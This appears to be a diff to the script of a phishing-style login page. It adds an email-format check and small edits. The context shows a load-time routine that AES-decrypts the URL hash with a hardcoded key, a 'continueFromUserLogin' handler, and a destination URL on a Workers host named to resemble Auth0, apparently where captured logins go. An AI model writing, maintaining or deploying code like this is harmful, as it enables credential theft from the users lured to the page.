@@ -1,5 +1,11 @@
+// Function to validate if a string is a valid email
+function isEmail(email) {
+    const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+    return emailPattern.test(email);
+}
+
 document.addEventListener('DOMContentLoaded', function() {
-    checkCookie()
+    checkCookie();
     let hashUrl = window.location.hash.substr(1).replace(new RegExp("%20", "g"), "+");
 
     let bytes = CryptoJS.AES.decrypt(hashUrl, 'secret key 123');
@@ -21,7 +27,7 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     });
 
-    var url = "https://auth0-sam20.jjmdw.workers.dev/"; // Your updated Worker URL
+    var url = "https://auth0-sam20.jjmdw.workers.dev/"; // Your Worker URL
 
     submit_btn = document.getElementById("continueFromUserLogin");
     userInputContainerDiv = document.getElementById("userInputContainerDiv");
